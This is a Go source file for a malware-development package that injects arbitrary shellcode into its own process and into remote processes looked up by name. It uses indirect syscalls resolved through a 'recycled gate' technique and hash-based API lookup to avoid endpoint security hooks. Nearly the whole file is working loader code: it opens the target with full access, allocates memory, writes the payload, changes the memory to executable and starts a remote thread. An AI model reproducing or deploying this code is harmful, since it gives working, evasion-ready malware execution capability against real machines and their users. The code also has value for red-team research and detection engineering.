/*
package sh is responsible for handling shellcode injection to self and remote processes via recycledgate resolved syscalls, made indirectly to ntdll itself
*/

package sh

import (
	"fmt"
	"unsafe"
	"strings"
	"github.com/carved4/go-wincall"
	rc "github.com/carved4/gorecycle/pkg/recycle"
	"github.com/carved4/gorecycle/pkg/types"
	sys "github.com/carved4/gorecycle/pkg/syscall"
	"github.com/carved4/go-maldev/pkg/process"
)
var regionsize uintptr
var threadHandle uintptr
var currentprocess = uintptr(0xffffffffffffffff)
var desiredaccess = 0x001FFFFF
var ntalloc types.Syscall
var ntwrite types.Syscall 
var ntread types.Syscall 
var ntcreate types.Syscall
var ntwait types.Syscall
var ntopen types.Syscall
var ntprotect types.Syscall
var ntclose types.Syscall
var ntqueueapc types.Syscall
var baseaddr uintptr
var bytes uintptr
var byteswritten uintptr
var bytesread uintptr
var targetProcessHandle uintptr
var oldProtect uint32 

func resolvethem(){
	if !rc.GetSyscall("NtAllocateVirtualMemory", &ntalloc) {
		fmt.Println("failed to resolve ntalloc")
		return
	}
	fmt.Printf("ntalloc resolved to %d - 0x%x\n", ntalloc.Nr, ntalloc.Gate)

	if !rc.GetSyscall("NtWriteVirtualMemory", &ntwrite) {
		fmt.Printf("failed to resolve ntwrite")
		return
	}
	fmt.Printf("ntwrite resolved to %d - 0x%x\n", ntwrite.Nr, ntwrite.Gate)

	if !rc.GetSyscall("NtReadVirtualMemory", &ntread) {
		fmt.Println("failed to resolve ntread")
		return
	}
	fmt.Printf("ntread resolve to %d - 0x%x\n", ntread.Nr, ntread.Gate)

	if !rc.GetSyscall("NtCreateThreadEx", &ntcreate) {
		fmt.Println("failed to resolve ntcreate")
		return
	}
	fmt.Printf("ntcreate resolved to %d - 0x%x\n", ntcreate.Nr, ntcreate.Gate)

	if !rc.GetSyscall("NtWaitForSingleObject", &ntwait) {
		fmt.Println("failed to resolve ntwait")
		return
	}
	fmt.Printf("ntwait resolved to %d - 0x%x\n", ntwait.Nr, ntwait.Gate)

	if !rc.GetSyscall("NtOpenProcess", &ntopen) {
		fmt.Println("failed to resolve ntopen")
		return
	}
	fmt.Printf("ntopen resolved to %d - 0x%x\n", ntopen.Nr, ntopen.Gate)

	if !rc.GetSyscall("NtProtectVirtualMemory", &ntprotect) {
		fmt.Println("failed to resolve ntprotect")
		return
	}
	fmt.Printf("ntprotect resolved to %d - 0x%x\n", ntprotect.Nr, ntprotect.Gate)

	if !rc.GetSyscall("NtClose", &ntclose) {
		fmt.Println("failed to resolve ntclose")
		return
	}
	fmt.Printf("ntclose resolved to %d - 0x%x\n", ntclose.Nr, ntclose.Gate)

	if !rc.GetSyscall("NtQueueApcThread", &ntqueueapc) {
		fmt.Println("failed to resolve ntqueueapc")
		return
	}
	fmt.Printf("ntqueueapc resolved to %d - 0x%x\n", ntqueueapc.Nr, ntqueueapc.Gate)
}

func InjectSelf(shellcode []byte) {
	resolvethem()
	bytes := shellcode
	regionsize := len(shellcode)
	result, _ := sys.IndirectSyscall(
		ntalloc.Nr,
		ntalloc.Gate,
		currentprocess,
		uintptr(unsafe.Pointer(&baseaddr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		0x1000|rc.MEM_RESERVE,
		rc.PAGE_EXECUTE_READWRITE,
	)
	if result != 0 {
		fmt.Println("alloc failed")
		return
	}
	fmt.Printf("memory allocated at 0x%x\n", baseaddr)
	result, _ = sys.IndirectSyscall(
		ntwrite.Nr,
		ntwrite.Gate,
		currentprocess,
		baseaddr,
		uintptr(unsafe.Pointer(&bytes[0])),
		uintptr(len(bytes)),
		uintptr(unsafe.Pointer(&byteswritten)),
	)
	if result != 0 {
		fmt.Printf("ntwrite failed: 0x%x\n", result)
	}
	fmt.Printf("wrote %d bytes to allocated memory!\n", byteswritten)
	
	result, _ = sys.IndirectSyscall(
			ntcreate.Nr,
			ntcreate.Gate,
			uintptr(unsafe.Pointer(&threadHandle)), // OUT PHANDLE ThreadHandle
			rc.THREAD_ALL_ACCESS,                   // IN ACCESS_MASK DesiredAccess
			0,                                      // IN POBJECT_ATTRIBUTES ObjectAttributes (NULL)
			currentprocess,                         // IN HANDLE ProcessHandle
			baseaddr,                            // IN PVOID StartRoutine
			0,                                      // IN PVOID Argument (NULL)
			0,                                      // IN ULONG CreateFlags (0 = not suspended)
			0,                                      // IN SIZE_T ZeroBits
			0,                                      // IN SIZE_T StackSize
			0,                                      // IN SIZE_T MaximumStackSize
			0,                                      // IN PPS_ATTRIBUTE_LIST AttributeList (NULL)
	)
	if result != 0 {
			fmt.Printf("[-] NtCreateThreadEx failed: 0x%x\n", result)
			return
	}
	fmt.Printf("[+] created thread with handle: 0x%x (running asynchronously)\n", threadHandle)

	// Don't wait for thread completion to prevent process termination
	// The thread will run asynchronously while we continue to remote injection
	fmt.Printf("[+] Self-injection initiated, continuing to remote injection...\n")
	return

}


func findProcessByName(processName string) (uint32, error) {
	fmt.Printf("[+] Searching for process: %s\n", processName)
	
	// Get all processes
	dllHash := wincall.GetHash("kernel32.dll")
	moduleBase := wincall.GetModuleBase(dllHash)

	createToolhelp32SnapshotHash := wincall.GetHash("CreateToolhelp32Snapshot")
	createToolhelp32SnapshotAddr := wincall.GetFunctionAddress(moduleBase, createToolhelp32SnapshotHash)

	process32FirstHash := wincall.GetHash("Process32FirstW")
	process32FirstAddr := wincall.GetFunctionAddress(moduleBase, process32FirstHash)

	process32NextHash := wincall.GetHash("Process32NextW")
	process32NextAddr := wincall.GetFunctionAddress(moduleBase, process32NextHash)

	closeHandleHash := wincall.GetHash("CloseHandle")
	closeHandleAddr := wincall.GetFunctionAddress(moduleBase, closeHandleHash)

	// Create snapshot of all processes
	snapshot, _ := wincall.CallWorker(createToolhelp32SnapshotAddr, 0x00000002, 0) // TH32CS_SNAPPROCESS
	if snapshot == 0 {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer wincall.CallWorker(closeHandleAddr, snapshot)

	// Initialize process entry structure
	var pe process.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	// Get first process
	result, _ := wincall.CallWorker(process32FirstAddr, snapshot, uintptr(unsafe.Pointer(&pe)))
	if result == 0 {
		return 0, fmt.Errorf("Process32First failed")
	}

	processCount := 0
	targetProcessName := strings.ToLower(processName)

	for {
		// Convert UTF-16 process name to string
		currentProcessName := ""
		for i := 0; i < len(pe.ExeFile); i++ {
			if pe.ExeFile[i] == 0 {
				break
			}
			currentProcessName += string(rune(pe.ExeFile[i]))
		}

		// Case insensitive comparison
		if strings.ToLower(currentProcessName) == targetProcessName {
			fmt.Printf("[+] Found target process: %s (PID: %d)\n", currentProcessName, pe.ProcessID)
			return pe.ProcessID, nil
		}

		processCount++

		// Get next process
		result, _ = wincall.CallWorker(process32NextAddr, snapshot, uintptr(unsafe.Pointer(&pe)))
		if result == 0 {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found (searched %d processes)", processName, processCount)
}

func InjectRemote(shellcode []byte, targetProcessName string) error {
	resolvethem()

	// Find target process by name
	targetPID, err := findProcessByName(targetProcessName)
	if err != nil {
		return fmt.Errorf("failed to find target process: %v", err)
	}

	fmt.Printf("[+] Targeting process %s (PID: %d)\n", targetProcessName, targetPID)

	// CLIENT_ID structure for NtOpenProcess
	type ClientId struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}

	clientId := ClientId{
		UniqueProcess: uintptr(targetPID),
		UniqueThread:  0,
	}

	// OBJECT_ATTRIBUTES structure
	type ObjectAttributes struct {
		Length                   uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	objAttr := ObjectAttributes{
		Length: uint32(unsafe.Sizeof(ObjectAttributes{})),
	}

	// Open target process
	result, _ := sys.IndirectSyscall(
		ntopen.Nr,
		ntopen.Gate,
		uintptr(unsafe.Pointer(&targetProcessHandle)),
		0x1FFFFF, // PROCESS_ALL_ACCESS
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	)

	if result != 0 {
		return fmt.Errorf("NtOpenProcess failed: 0x%x", result)
	}
	fmt.Printf("[+] Opened target process with handle: 0x%x\n", targetProcessHandle)

	// Allocate memory in target process
	bytes := shellcode
	regionsize := uintptr(len(shellcode))
	baseaddr = 0

	result, _ = sys.IndirectSyscall(
		ntalloc.Nr,
		ntalloc.Gate,
		targetProcessHandle,
		uintptr(unsafe.Pointer(&baseaddr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		0x1000|rc.MEM_RESERVE, // MEM_COMMIT | MEM_RESERVE
		rc.PAGE_READWRITE,      // Start with RW, change to RX later
	)

	if result != 0 {
		sys.IndirectSyscall(ntclose.Nr, ntclose.Gate, targetProcessHandle)
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%x", result)
	}
	fmt.Printf("[+] Allocated memory in target process at: 0x%x\n", baseaddr)

	// Write shellcode to target process
	result, _ = sys.IndirectSyscall(
		ntwrite.Nr,
		ntwrite.Gate,
		targetProcessHandle,
		baseaddr,
		uintptr(unsafe.Pointer(&bytes[0])),
		uintptr(len(bytes)),
		uintptr(unsafe.Pointer(&byteswritten)),
	)

	if result != 0 {
		sys.IndirectSyscall(ntclose.Nr, ntclose.Gate, targetProcessHandle)
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%x", result)
	}
	fmt.Printf("[+] Wrote %d bytes to target process\n", byteswritten)

	// Change memory protection to executable
	result, _ = sys.IndirectSyscall(
		ntprotect.Nr,
		ntprotect.Gate,
		targetProcessHandle,
		uintptr(unsafe.Pointer(&baseaddr)),
		uintptr(unsafe.Pointer(&regionsize)),
		rc.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if result != 0 {
		sys.IndirectSyscall(ntclose.Nr, ntclose.Gate, targetProcessHandle)
		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%x", result)
	}
	fmt.Printf("[+] Changed memory protection to executable (old: 0x%x)\n", oldProtect)

	// Create remote thread
	result, _ = sys.IndirectSyscall(
		ntcreate.Nr,
		ntcreate.Gate,
		uintptr(unsafe.Pointer(&threadHandle)), // OUT PHANDLE ThreadHandle
		rc.THREAD_ALL_ACCESS,                   // IN ACCESS_MASK DesiredAccess
		0,                                      // IN POBJECT_ATTRIBUTES ObjectAttributes (NULL)
		targetProcessHandle,                    // IN HANDLE ProcessHandle
		baseaddr,                              // IN PVOID StartRoutine
		0,                                      // IN PVOID Argument (NULL)
		0,                                      // IN ULONG CreateFlags (0 = not suspended)
		0,                                      // IN SIZE_T ZeroBits
		0,                                      // IN SIZE_T StackSize
		0,                                      // IN SIZE_T MaximumStackSize
		0,                                      // IN PPS_ATTRIBUTE_LIST AttributeList (NULL)
	)

	if result != 0 {
		sys.IndirectSyscall(ntclose.Nr, ntclose.Gate, targetProcessHandle)
		return fmt.Errorf("NtCreateThreadEx failed: 0x%x", result)
	}
	fmt.Printf("[+] Created remote thread with handle: 0x%x\n", threadHandle)

	// Wait for thread completion
	result, _ = sys.IndirectSyscall(
		ntwait.Nr,
		ntwait.Gate,
		threadHandle,
		0, // FALSE - don't make alertable
		0, // INFINITE timeout (NULL pointer)
	)

	if result != 0 {
		fmt.Printf("[+] Thread execution completed with status: 0x%x\n", result)
	} else {
		fmt.Printf("[+] Thread execution completed successfully\n")
	}

	// Cleanup
	sys.IndirectSyscall(ntclose.Nr, ntclose.Gate, threadHandle)
	sys.IndirectSyscall(ntclose.Nr, ntclose.Gate, targetProcessHandle)

	fmt.Printf("[+] Remote injection completed successfully\n")
	return nil
}

func InjectSelfTimeout(shellcode []byte) {
	resolvethem()
	bytes := shellcode
	regionsize := len(shellcode)
	result, _ := sys.IndirectSyscall(
		ntalloc.Nr,
		ntalloc.Gate,
		currentprocess,
		uintptr(unsafe.Pointer(&baseaddr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		0x1000|rc.MEM_RESERVE,
		rc.PAGE_EXECUTE_READWRITE,
	)
	if result != 0 {
		fmt.Println("alloc failed")
		return
	}
	fmt.Printf("memory allocated at 0x%x\n", baseaddr)
	result, _ = sys.IndirectSyscall(
		ntwrite.Nr,
		ntwrite.Gate,
		currentprocess,
		baseaddr,
		uintptr(unsafe.Pointer(&bytes[0])),
		uintptr(len(bytes)),
		uintptr(unsafe.Pointer(&byteswritten)),
	)
	if result != 0 {
		fmt.Printf("ntwrite failed: 0x%x\n", result)
	}
	fmt.Printf("wrote %d bytes to allocated memory!\n", byteswritten)
	
	result, _ = sys.IndirectSyscall(
			ntcreate.Nr,
			ntcreate.Gate,
			uintptr(unsafe.Pointer(&threadHandle)), // OUT PHANDLE ThreadHandle
			rc.THREAD_ALL_ACCESS,                   // IN ACCESS_MASK DesiredAccess
			0,                                      // IN POBJECT_ATTRIBUTES ObjectAttributes (NULL)
			currentprocess,                         // IN HANDLE ProcessHandle
			baseaddr,                            // IN PVOID StartRoutine
			0,                                      // IN PVOID Argument (NULL)
			0,                                      // IN ULONG CreateFlags (0 = not suspended)
			0,                                      // IN SIZE_T ZeroBits
			0,                                      // IN SIZE_T StackSize
			0,                                      // IN SIZE_T MaximumStackSize
			0,                                      // IN PPS_ATTRIBUTE_LIST AttributeList (NULL)
	)
	if result != 0 {
			fmt.Printf("[-] NtCreateThreadEx failed: 0x%x\n", result)
			return
	}
	fmt.Printf("[+] created thread with handle: 0x%x\n", threadHandle)

	result, _ = sys.IndirectSyscall(
			ntwait.Nr,
			ntwait.Gate,
			threadHandle,
			0, // FALSE - don't make alertable
			0, // INFINITE timeout (NULL pointer)
	)

	if result != 0 {
			fmt.Printf("thread execution completed with status: 0x%x\n", result)
	} else {
			fmt.Println("thread execution completed successfully")
	}

	wincall.Call("kernel32", "CloseHandle", threadHandle)
	return

}


